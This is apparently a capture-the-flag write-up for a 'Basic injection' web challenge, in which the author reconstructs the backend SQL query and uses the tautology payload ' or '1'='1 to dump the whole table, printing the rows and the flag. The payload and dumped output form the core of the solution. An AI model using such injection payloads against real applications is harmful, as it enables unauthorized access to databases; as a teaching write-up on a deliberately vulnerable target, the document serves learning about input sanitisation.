## Solution

The first thing I did, it's a thing that I use to do in every CTF that contains a website.
I reviewed all page source and scripts and found nothing. 

After the unsucsessfull atempt i thought:

In this challenge you are asked *to leak whole database*.
With this clue and the challnge title *Basic injection* you can supose that
this challenge will be working arround SQL INJECTION.

I haven't worked before with SQL INJECTION but I had a few ideas.

First of all I tried the following query:

```
" or true 
```
Which gave unsucsessfull results as I did'nt know what i was doing.

Afet writting on a paper whats happening i reached that the following query that is happening is:

```
SELECT * FROM data WHERE username='(our input)'
```
So i wrote the input ' or '1'='1 which produces the following hypotetic query:

```
SELECT * FROM data WHERE username='' or '1'='1' 
```
Which evaluates always to true. So we get all the database!
```
Name: Luke
Data: I made this problem.
Name: Alec
Data: Steam boys.
Name: Jalen
Data: Pump that iron fool.
Name: Eric
Data: I make cars.
Name: Sam
Data: Thinks he knows SQL.
Name: fl4g__giv3r
Data: th4t_is_why_you_n33d_to_sanitiz3_inputs
Name: snoutpop
Data: jowls
Name: Chunbucket
Data: @datboiiii 
```

From where we get that the flag is:
*th4t\_is\_why\_you\_n33d\_to\_sanitiz3\_inputs*
